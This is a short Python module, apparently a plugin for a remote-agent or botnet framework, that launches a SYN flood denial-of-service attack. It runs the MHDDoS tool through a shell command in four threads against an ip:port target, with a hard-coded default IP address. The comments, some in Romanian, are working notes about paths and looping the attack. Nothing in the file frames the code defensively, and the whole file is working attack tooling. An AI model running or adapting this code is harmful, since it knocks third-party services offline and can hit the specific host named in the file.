#!/usr/bin/python
# standard libarary
import os
import sys
import json
import socket
if sys.version_info[0] > 2:
    from queue import Queue
else:
    from Queue import Queue
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['linux2','darwin']
threads = {}
targets = []
tasks = Queue()
usage = 'ddos4 [ip:port]'
desciription = """
Slow down a target IP:port
"""
@util.threaded
def _threader():
    while True:
        global tasks
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break

def _slow(host):
    try:     
        #Asa trebuie sa introduca utilizatorul ca sa nu mai fac campuri suplimentare in frontend
        #TODO pune path-ul bun sau pune in .bashrc start.py
        command_l4=f"python3 /home/agent1/MHDDoS/start.py SYN {host} 10 100000" #Aici "host" e de forma ip:port
        command_l4_while=f"while true; do {command_l4}; done"
        #TODO 2 cleanup func in caz de while true 
        #https://bobbyhadz.com/blog/wait-process-until-all-subprocesses-finish-in-python#using-the-subprocesscall-method-to-wait-for-a-process-to-complete
        if subprocess.call(command_l4, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
            return True
        else:
            return False
    except Exception as e:
        util.log("{} error: {}".format(_slow.__name__, str(e)))
        return False

def run(target='178.128.255.150:80'):
   
    global tasks
    global threads

    for i in range(4): #cate core-uri are masina
        tasks.put_nowait((_slow, target))
    for i in range(1, tasks.qsize()):
        threads['ddos4-%d' % i] = _threader()
    for t in threads:
        threads[t].join()
    return "MHDDoS finised"

